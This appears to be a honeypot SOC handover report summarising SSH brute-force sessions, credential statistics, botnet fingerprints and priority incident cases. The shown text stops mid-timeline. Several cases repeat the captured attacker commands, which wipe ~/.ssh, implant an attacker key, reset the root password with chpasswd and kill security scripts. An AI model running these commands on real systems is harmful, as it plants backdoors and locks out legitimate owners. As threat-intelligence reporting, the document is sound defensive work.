# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-28 |
| **Generated At** | 2026-05-28T13:56:07Z |
| **Shift Time** | 13:56 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **177** |
| Confirmed Threats | **165** |
| False Positives Filtered | **12** (6.8%) |
| Unique Attacker IPs | **38** |
| Countries of Origin | **15** |
| High Severity Cases | **47** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **130** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **100** |
| Unique Credential Pairs | **52** |
| Unique Usernames | **28** |
| Unique Passwords | **49** |
| Successful Auth Pairs | **35** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 47 |
| `345gs5662d34` | 22 |
| `admin` | 3 |
| `ubuntu` | 2 |
| `ali` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 22 |
| `3245gs5662d34` | 20 |
| `1234` | 4 |
| `fjbdfdjkdsfs541544` | 3 |
| `123456` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 22 |
| `root` | `3245gs5662d34` | 20 |
| `admin` | `fjbdfdjkdsfs541544` | 3 |
| `root` | `Dy123456` | 2 |
| `root` | `Linux123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Dy123456` | `118.163.132.211` | 2026-05-28T10:42:16 |
| `root` | `Linux123` | `118.163.132.211` | 2026-05-28T10:45:11 |
| `root` | `3245gs5662d34` | `118.163.132.211` | 2026-05-28T10:45:18 |
| `root` | `qwe@123` | `186.10.86.130` | 2026-05-28T10:50:43 |
| `root` | `3245gs5662d34` | `186.10.86.130` | 2026-05-28T10:50:50 |
| `root` | `Minecraft1` | `118.163.132.211` | 2026-05-28T10:50:59 |
| `root` | `m123456` | `180.184.38.93` | 2026-05-28T10:52:46 |
| `root` | `Hello12345` | `180.184.38.93` | 2026-05-28T10:53:50 |
| `root` | `P@ssw0rd!!!` | `102.88.137.213` | 2026-05-28T10:57:17 |
| `root` | `3245gs5662d34` | `102.88.137.213` | 2026-05-28T10:57:23 |
| `root` | `P@ssw0rd1` | `102.88.137.213` | 2026-05-28T10:59:02 |
| `root` | `P@ssword123` | `102.88.137.213` | 2026-05-28T11:06:08 |
| `root` | `159753` | `102.88.137.213` | 2026-05-28T11:07:56 |
| `root` | `arcsight` | `102.88.137.213` | 2026-05-28T11:09:47 |
| `root` | `qwe@123` | `102.88.137.213` | 2026-05-28T11:16:57 |
| `root` | `qwert` | `102.88.137.213` | 2026-05-28T11:20:31 |
| `root` | `22` | `4.240.82.91` | 2026-05-28T11:45:00 |
| `root` | `3245gs5662d34` | `4.240.82.91` | 2026-05-28T11:46:04 |
| `root` | `Linux123` | `4.240.82.91` | 2026-05-28T12:11:38 |
| `root` | `Minecraft1` | `4.240.82.91` | 2026-05-28T12:20:42 |
| `root` | `Dy123456` | `4.240.82.91` | 2026-05-28T12:29:41 |
| `root` | `welcome1` | `118.193.61.170` | 2026-05-28T13:11:13 |
| `root` | `3245gs5662d34` | `118.193.61.170` | 2026-05-28T13:11:17 |
| `root` | `111222` | `124.155.125.131` | 2026-05-28T13:14:38 |
| `root` | `3245gs5662d34` | `124.155.125.131` | 2026-05-28T13:14:42 |
| `root` | `nPSpP4PBW0` | `120.53.244.204` | 2026-05-28T13:24:05 |
| `root` | `123qweASDZXC` | `49.72.212.22` | 2026-05-28T13:30:58 |
| `root` | `qq123456` | `120.53.244.204` | 2026-05-28T13:31:33 |
| `root` | `Qaz12345` | `101.47.156.21` | 2026-05-28T13:41:14 |
| `root` | `3245gs5662d34` | `101.47.156.21` | 2026-05-28T13:41:16 |
| `root` | `fuckoff` | `179.184.242.48` | 2026-05-28T13:46:39 |
| `root` | `3245gs5662d34` | `179.184.242.48` | 2026-05-28T13:46:47 |
| `root` | `P@ssword00` | `179.184.242.48` | 2026-05-28T13:49:21 |
| `root` | `qwe123!@#QWE` | `179.184.242.48` | 2026-05-28T13:52:02 |
| `root` | `Qwe12345` | `179.184.242.48` | 2026-05-28T13:54:53 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **177** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 155 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 90 | 10 |
| `03a80b21afa8...` | Modern SSH client | 53 | 10 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 90 | 10 | Mirai/variant |
| `03a80b21afa8...` | libssh | 53 | 10 | Modern SSH client |
| `95420f9d932d...` | libssh | 12 | 4 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 4 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 21 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:m56BASE3OSVq"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `118.163.132.211`, `49.72.212.22`, `180.184.38.93`, `120.53.244.204`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `186.10.86.130`, `4.240.82.91`, `102.88.137.213`, `124.155.125.131`, `101.47.156.21`, `118.163.132.211`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **38** |
| Unique ASNs | **27** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS3462` | Data Communication Business Group | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | MEDIUM |
| `AS4685` | Asahi Net | 2 | HIGH |
| `AS211298` | Driftnet Ltd | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (47)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-094c8e103a73

| Field | Detail |
|---|---|
| **Source IP** | `118.163.132[.]211` |
| **First Seen** | 2026-05-28 10:42 |
| **Last Seen** | 2026-05-28 10:42 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:m56BASE3OSVq"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 10:42:15` | `cowrie.session.connect` |
| `2026-05-28 10:42:15` | `cowrie.client.version` |
| `2026-05-28 10:42:15` | `cowrie.client.kex` |
| `2026-05-28 10:42:16` | `cowrie.login.success` |
| `2026-05-28 10:42:16` | `cowrie.session.params` |
| `2026-05-28 10:42:16` | `cowrie.command.input` |
| `2026-05-28 10:42:16` | `cowrie.command.failed` |
| `2026-05-28 10:42:17` | `cowrie.log.closed` |
| `2026-05-28 10:42:17` | `cowrie.session.params` |
| `2026-05-28 10:42:17` | `cowrie.command.input` |
| `2026-05-28 10:42:17` | `cowrie.session.file_download` |
| `2026-05-28 10:42:17` | `cowrie.log.closed` |
| `2026-05-28 10:42:27` | `cowrie.session.params` |
| `2026-05-28 10:42:27` | `cowrie.command.input` |
| `2026-05-28 10:42:27` | `cowrie.log.closed` |
| `2026-05-28 10:42:28` | `cowrie.session.params` |
| `2026-05-28 10:42:28` | `cowrie.command.input` |
| `2026-05-28 10:42:28` | `cowrie.log.closed` |
| `2026-05-28 10:42:28` | `cowrie.session.params` |
| `2026-05-28 10:42:28` | `cowrie.command.input` |
| `2026-05-28 10:42:28` | `cowrie.session.file_download` |
| `2026-05-28 10:42:28` | `cowrie.log.closed` |
| `2026-05-28 10:42:28` | `cowrie.session.params` |
| `2026-05-28 10:42:28` | `cowrie.command.input` |
| `2026-05-28 10:42:29` | `cowrie.log.closed` |
| `2026-05-28 10:42:29` | `cowrie.session.params` |
| `2026-05-28 10:42:29` | `cowrie.command.input` |
| `2026-05-28 10:42:29` | `cowrie.log.closed` |
| `2026-05-28 10:42:29` | `cowrie.session.params` |
| `2026-05-28 10:42:29` | `cowrie.command.input` |
| `2026-05-28 10:42:29` | `cowrie.command.input` |
| `2026-05-28 10:42:30` | `cowrie.log.closed` |
| `2026-05-28 10:42:30` | `cowrie.session.params` |
| `2026-05-28 10:42:30` | `cowrie.command.input` |
| `2026-05-28 10:42:30` | `cowrie.log.closed` |
| `2026-05-28 10:42:30` | `cowrie.session.params` |
| `2026-05-28 10:42:30` | `cowrie.command.input` |
| `2026-05-28 10:42:31` | `cowrie.log.closed` |
| `2026-05-28 10:42:31` | `cowrie.session.params` |
| `2026-05-28 10:42:31` | `cowrie.command.input` |
| `2026-05-28 10:42:31` | `cowrie.log.closed` |
| `2026-05-28 10:42:31` | `cowrie.session.params` |
| `2026-05-28 10:42:31` | `cowrie.command.input` |
| `2026-05-28 10:42:32` | `cowrie.log.closed` |
| `2026-05-28 10:42:32` | `cowrie.session.params` |
| `2026-05-28 10:42:32` | `cowrie.command.input` |
| `2026-05-28 10:42:32` | `cowrie.log.closed` |
| `2026-05-28 10:42:32` | `cowrie.session.params` |
| `2026-05-28 10:42:32` | `cowrie.command.input` |
| `2026-05-28 10:42:32` | `cowrie.log.closed` |
| `2026-05-28 10:42:33` | `cowrie.session.params` |
| `2026-05-28 10:42:33` | `cowrie.command.input` |
| `2026-05-28 10:42:33` | `cowrie.log.closed` |
| `2026-05-28 10:42:33` | `cowrie.session.params` |
| `2026-05-28 10:42:33` | `cowrie.command.input` |
| `2026-05-28 10:42:33` | `cowrie.log.closed` |
| `2026-05-28 10:42:34` | `cowrie.session.params` |
| `2026-05-28 10:42:34` | `cowrie.command.input` |
| `2026-05-28 10:42:34` | `cowrie.log.closed` |
| `2026-05-28 10:42:34` | `cowrie.session.params` |
| `2026-05-28 10:42:34` | `cowrie.command.input` |
| `2026-05-28 10:42:34` | `cowrie.log.closed` |
| `2026-05-28 10:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.132[.]211` to AbuseIPDB if not already reported
- [ ] Block `118.163.132[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d42b7d05d3e3

| Field | Detail |
|---|---|
| **Source IP** | `118.163.132[.]211` |
| **First Seen** | 2026-05-28 10:45 |
| **Last Seen** | 2026-05-28 10:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 10:45:10` | `cowrie.session.connect` |
| `2026-05-28 10:45:10` | `cowrie.client.version` |
| `2026-05-28 10:45:11` | `cowrie.client.kex` |
| `2026-05-28 10:45:11` | `cowrie.login.success` |
| `2026-05-28 10:45:11` | `cowrie.session.params` |
| `2026-05-28 10:45:11` | `cowrie.command.input` |
| `2026-05-28 10:45:11` | `cowrie.command.failed` |
| `2026-05-28 10:45:12` | `cowrie.log.closed` |
| `2026-05-28 10:45:12` | `cowrie.session.params` |
| `2026-05-28 10:45:12` | `cowrie.command.input` |
| `2026-05-28 10:45:12` | `cowrie.session.file_download` |
| `2026-05-28 10:45:12` | `cowrie.log.closed` |
| `2026-05-28 10:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.132[.]211` to AbuseIPDB if not already reported
- [ ] Block `118.163.132[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc3685d28f6f

| Field | Detail |
|---|---|
| **Source IP** | `118.163.132[.]211` |
| **First Seen** | 2026-05-28 10:45 |
| **Last Seen** | 2026-05-28 10:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 10:45:17` | `cowrie.session.connect` |
| `2026-05-28 10:45:17` | `cowrie.client.version` |
| `2026-05-28 10:45:17` | `cowrie.client.kex` |
| `2026-05-28 10:45:18` | `cowrie.login.success` |
| `2026-05-28 10:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.132[.]211` to AbuseIPDB if not already reported
- [ ] Block `118.163.132[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7b29e0cd459

| Field | Detail |
|---|---|
| **Source IP** | `186.10.86[.]130` |
| **First Seen** | 2026-05-28 10:50 |
| **Last Seen** | 2026-05-28 10:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 10:50:41` | `cowrie.session.connect` |
| `2026-05-28 10:50:41` | `cowrie.client.version` |
| `2026-05-28 10:50:41` | `cowrie.client.kex` |
| `2026-05-28 10:50:43` | `cowrie.login.success` |
| `2026-05-28 10:50:43` | `cowrie.session.params` |
| `2026-05-28 10:50:43` | `cowrie.command.input` |
| `2026-05-28 10:50:43` | `cowrie.command.failed` |
| `2026-05-28 10:50:44` | `cowrie.log.closed` |
| `2026-05-28 10:50:44` | `cowrie.session.params` |
| `2026-05-28 10:50:44` | `cowrie.command.input` |
| `2026-05-28 10:50:45` | `cowrie.session.file_download` |
| `2026-05-28 10:50:45` | `cowrie.log.closed` |
| `2026-05-28 10:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.10.86[.]130` to AbuseIPDB if not already reported
- [ ] Block `186.10.86[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b56ce00204e2

| Field | Detail |
|---|---|
| **Source IP** | `186.10.86[.]130` |
| **First Seen** | 2026-05-28 10:50 |
| **Last Seen** | 2026-05-28 10:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 10:50:49` | `cowrie.session.connect` |
| `2026-05-28 10:50:49` | `cowrie.client.version` |
| `2026-05-28 10:50:49` | `cowrie.client.kex` |
| `2026-05-28 10:50:50` | `cowrie.login.success` |
| `2026-05-28 10:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.10.86[.]130` to AbuseIPDB if not already reported
- [ ] Block `186.10.86[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd90ac6a3396

| Field | Detail |
|---|---|
| **Source IP** | `118.163.132[.]211` |
| **First Seen** | 2026-05-28 10:50 |
| **Last Seen** | 2026-05-28 10:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 10:50:58` | `cowrie.session.connect` |
| `2026-05-28 10:50:58` | `cowrie.client.version` |
| `2026-05-28 10:50:58` | `cowrie.client.kex` |
| `2026-05-28 10:50:59` | `cowrie.login.success` |
| `2026-05-28 10:50:59` | `cowrie.session.params` |
| `2026-05-28 10:50:59` | `cowrie.command.input` |
| `2026-05-28 10:50:59` | `cowrie.command.failed` |
| `2026-05-28 10:50:59` | `cowrie.log.closed` |
| `2026-05-28 10:51:00` | `cowrie.session.params` |
| `2026-05-28 10:51:00` | `cowrie.command.input` |
| `2026-05-28 10:51:00` | `cowrie.session.file_download` |
| `2026-05-28 10:51:00` | `cowrie.log.closed` |
| `2026-05-28 10:51:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.132[.]211` to AbuseIPDB if not already reported
- [ ] Block `118.163.132[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9efba762a3b6

| Field | Detail |
|---|---|
| **Source IP** | `118.163.132[.]211` |
| **First Seen** | 2026-05-28 10:51 |
| **Last Seen** | 2026-05-28 10:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 10:51:02` | `cowrie.session.connect` |
| `2026-05-28 10:51:02` | `cowrie.client.version` |
| `2026-05-28 10:51:02` | `cowrie.client.kex` |
| `2026-05-28 10:51:02` | `cowrie.login.success` |
| `2026-05-28 10:51:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.132[.]211` to AbuseIPDB if not already reported
- [ ] Block `118.163.132[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e11609ca04d1

| Field | Detail |
|---|---|
| **Source IP** | `180.184.38[.]93` |
| **First Seen** | 2026-05-28 10:52 |
| **Last Seen** | 2026-05-28 10:53 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:gWVTPMGKoMwu"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 10:52:44` | `cowrie.session.connect` |
| `2026-05-28 10:52:45` | `cowrie.client.version` |
| `2026-05-28 10:52:45` | `cowrie.client.kex` |
| `2026-05-28 10:52:46` | `cowrie.login.success` |
| `2026-05-28 10:52:46` | `cowrie.session.params` |
| `2026-05-28 10:52:46` | `cowrie.command.input` |
| `2026-05-28 10:52:46` | `cowrie.command.failed` |
| `2026-05-28 10:52:47` | `cowrie.log.closed` |
| `2026-05-28 10:52:47` | `cowrie.session.params` |
| `2026-05-28 10:52:47` | `cowrie.command.input` |
| `2026-05-28 10:52:47` | `cowrie.session.file_download` |
| `2026-05-28 10:52:47` | `cowrie.log.closed` |
| `2026-05-28 10:52:56` | `cowrie.session.params` |
| `2026-05-28 10:52:56` | `cowrie.command.input` |
| `2026-05-28 10:52:57` | `cowrie.log.closed` |
| `2026-05-28 10:52:57` | `cowrie.session.params` |
| `2026-05-28 10:52:57` | `cowrie.command.input` |
| `2026-05-28 10:52:57` | `cowrie.log.closed` |
| `2026-05-28 10:52:57` | `cowrie.session.params` |
| `2026-05-28 10:52:57` | `cowrie.command.input` |
| `2026-05-28 10:52:58` | `cowrie.session.file_download` |
| `2026-05-28 10:52:58` | `cowrie.log.closed` |
| `2026-05-28 10:52:58` | `cowrie.session.params` |
| `2026-05-28 10:52:58` | `cowrie.command.input` |
| `2026-05-28 10:52:58` | `cowrie.log.closed` |
| `2026-05-28 10:52:58` | `cowrie.session.params` |
| `2026-05-28 10:52:58` | `cowrie.command.input` |
| `2026-05-28 10:52:59` | `cowrie.log.closed` |
| `2026-05-28 10:52:59` | `cowrie.session.params` |
